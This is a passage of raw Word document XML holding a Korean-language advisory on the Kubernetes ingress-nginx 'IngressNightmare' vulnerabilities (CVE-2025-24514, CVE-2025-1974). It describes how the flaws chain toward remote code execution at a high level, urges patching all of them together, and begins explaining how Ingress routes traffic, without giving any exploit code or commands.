          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>CVE-2025-24514</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2025</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>년</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>월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공개된</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘IngressNightmare’ </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>시리즈</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 5</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>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취약점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중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하나입니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이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중</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> CVE-2025-1974</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는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가장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심각한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취약점으로</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, CVSS 9.8(critical) </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>등급을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받았으며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다른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입력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검증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취약점</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">(CVE-2025-24514, CVE-2025-1097, CVE-2025-1098 </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>등</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>과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조합될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경우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인증되지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않은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원격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코드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실행</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(RCE)</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>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이어질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수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있습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51A453FB" w14:textId="2231F57D" w:rsidR="00E27F85" w:rsidRPr="00F630FB" w:rsidRDefault="00C97778" w:rsidP="00C97778">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>즉</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, CVE-2025-24514</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>와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같은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주입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취약점은</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> CVE-2025-1974</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>와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체이닝되어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공격자가</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Kubernetes </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터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전체를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장악할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수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있는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경로를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제공합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이러한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구조적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연관성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때문에</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>모든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관련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취약점에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대한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동시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패치와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대응이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반드시</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>필요합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C97778">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00B854B5" w:rsidRPr="00F630FB">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2836B327" w14:textId="52617AAE" w:rsidR="00E27F85" w:rsidRPr="00D6335C" w:rsidRDefault="00B854B5">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D6335C">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>기술적 배경</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B96858F" w14:textId="6EB8C1D4" w:rsidR="00D6335C" w:rsidRPr="00D6335C" w:rsidRDefault="00D6335C" w:rsidP="00D6335C">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="NanumSquareR" w:eastAsia="NanumSquareR" w:hAnsi="NanumSquareR"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D6335C">
        <w:rPr>
          <w:rFonts w:ascii="NanumSquareR" w:eastAsia="NanumSquareR" w:hAnsi="NanumSquareR"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">3.1. </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Kubernetes Ingress </w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>구조</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>동작</w:t>
      </w:r>
      <w:r w:rsidR="00C76F4F" w:rsidRPr="00C76F4F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6F4F" w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>원리</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156CDBA0" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Kubernetes Ingress</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는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클러스터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외부에서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내부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서비스로</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP(S) </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>트래픽을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안전하게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라우팅하는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핵심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리소스입니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">. Ingress </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>리소스는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도메인</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>경로</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인증</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, TLS </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>종료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등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다양한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규칙을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정의할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수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있으며</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터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외부에서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들어오는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트래픽이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어떤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내부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서비스로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전달되는지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결정합니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C323B68" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>의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동작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흐름은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다음과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같습니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1DB3AF" w14:textId="77777777" w:rsidR="00C76F4F" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클라이언트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hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>→</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> LoadBalancer/NodePort </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>→</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress Controller </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>→</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Ingress Resource </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>→</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Backend Service </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>→</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> Pod </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>순으로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트래픽이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전달됩니다</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30A30EEB" w14:textId="54833589" w:rsidR="00D6335C" w:rsidRPr="00C76F4F" w:rsidRDefault="00C76F4F" w:rsidP="00C76F4F">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Ingress</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>는</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> URL </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>및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도메인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기반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라우팅</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로드밸런싱</w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">, SSL </w:t>
      </w:r>
      <w:r w:rsidRPr="00C76F4F">
        <w:rPr>
